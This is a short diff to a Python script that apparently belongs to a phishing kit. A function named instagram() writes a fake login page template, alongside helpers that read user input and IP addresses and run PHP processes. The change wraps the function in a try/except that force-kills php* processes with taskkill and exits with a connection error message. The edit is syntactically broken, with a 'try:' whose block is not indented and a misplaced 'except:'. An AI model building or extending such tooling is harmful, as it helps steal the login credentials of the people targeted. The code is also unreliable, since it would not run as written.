@@ -13,6 +13,7 @@ import time
 stat_file = 0
 # instagram temp
 def instagram():
+    try:
     path =("""<!DOCTYPE html>
     <html data-passport-version="5" lang="en"><head>
     <style>
@@ -620,7 +621,13 @@ exit();""")
         userin()
         readip()
         info()
-
+except:
+    with open("exit","w") as kill:
+      Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
+      print("please check your internet connection ! ! !")
+      time.sleep(5)
+      os.system("clear")
+      sys.exit()
     
 def github():
   try:
